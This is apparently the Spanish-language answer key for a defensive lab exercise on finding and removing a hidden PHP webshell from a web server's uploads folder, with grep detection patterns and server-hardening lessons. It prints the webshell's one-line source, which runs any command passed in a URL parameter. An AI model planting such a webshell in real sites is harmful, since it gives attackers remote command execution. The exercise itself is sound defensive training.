# Solución — Lab 13

## 1. Buscar patrones de webshell

```bash
grep -rnEl 'system\(|shell_exec\(|passthru\(|eval\(base64_decode' /var/www
```

Aparece `/var/www/html/uploads/.thumb.php`. Dos banderas rojas: está en
`uploads/` (que no debería tener código) y empieza por `.` (oculto).

```bash
cat /var/www/html/uploads/.thumb.php
# <?php if (isset($_GET['c'])) { system($_GET['c']); } ?>
```

Eso ejecuta cualquier comando que llegue por `?c=...`. Es una webshell.

## 2. Borrarla

```bash
sudo rm -f /var/www/html/uploads/.thumb.php
```

Revisa que no haya más (a veces dejan varias):

```bash
find /var/www -name '*.php' -path '*uploads*'
grep -rnEl 'system\(|shell_exec\(|passthru\(|eval\(base64_decode' /var/www
```

## Verifica

```bash
bash /opt/lab/check.sh
```

## Lecciones

- Las webshells se esconden en carpetas de subida y con nombres de archivo
  inocentes u ocultos. Busca por patrón de código, no por nombre.
- Defensa: la carpeta `uploads/` nunca debe ejecutar PHP (config del servidor),
  validar tipos de archivo subidos, y comparar contra una línea base de
  integridad (hashes) para detectar archivos nuevos.
